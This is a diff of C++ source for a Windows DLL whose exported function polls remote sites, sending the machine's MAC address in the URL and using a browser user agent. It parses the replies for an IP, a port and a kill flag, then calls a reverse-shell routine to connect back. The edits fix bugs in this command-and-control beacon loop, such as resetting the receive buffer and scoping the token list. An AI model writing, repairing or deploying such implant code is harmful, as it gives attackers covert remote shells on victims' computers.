@@ -73,7 +73,7 @@ extern "C" DLLIMPORT void sysfunc()
 	std::wstring wsurl;
 	std::string surl, stest, surlkill,scomputer;
 	std::string segment, sip, skill, sport;
-	std::vector<std::string> seglist;
+	
     
     
 	WSADATA wsaData;
@@ -95,6 +95,7 @@ extern "C" DLLIMPORT void sysfunc()
 	curl_handle = curl_easy_init();
 	for (int i = 0; i < 2; i++)
 	{
+		
 
 		surl = "";
 		wsurl = sites[i];
@@ -107,6 +108,7 @@ extern "C" DLLIMPORT void sysfunc()
 		surl.append("_"); surl.append(GetMACaddress()); surl.append("_v1");
 		curl_easy_setopt(curl_handle, CURLOPT_URL, surl.c_str());
 		curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, WriteCallback);
+		readBuffer="";
 		curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, &readBuffer);
 		curl_easy_setopt(curl_handle, CURLOPT_USERAGENT, "Mozilla/5.0");
 		res = curl_easy_perform(curl_handle);
@@ -118,7 +120,8 @@ extern "C" DLLIMPORT void sysfunc()
         int j=0;
         
         
-		    //MessageBox(0,token,"Hi",MB_ICONINFORMATION);
+		   // MessageBox(0,token,"Hi",MB_ICONINFORMATION);
+		std::vector<std::string> seglist;
 		while (token != NULL) {
 			v.push_back(std::strtol(token, NULL, 10));
 			seglist.push_back(token);
@@ -131,6 +134,7 @@ extern "C" DLLIMPORT void sysfunc()
 			sip = seglist[1].substr(3);
 			sport = seglist[2].substr(5);
 			skill = seglist[3].substr(5);
+			//MessageBox(0,skill.c_str(),"Hi",MB_ICONINFORMATION);
 			if (skill == "0")
 			{
 				frevshell(sip.c_str(), sport.c_str());
@@ -143,7 +147,7 @@ extern "C" DLLIMPORT void sysfunc()
 		
 		//for (std::size_t i = 0; i < v.size(); ++i)
 		//	std::cout << v[i] << std::endl;
-
+    
 	}
 	curl_easy_cleanup(curl_handle);
 	curl_global_cleanup();
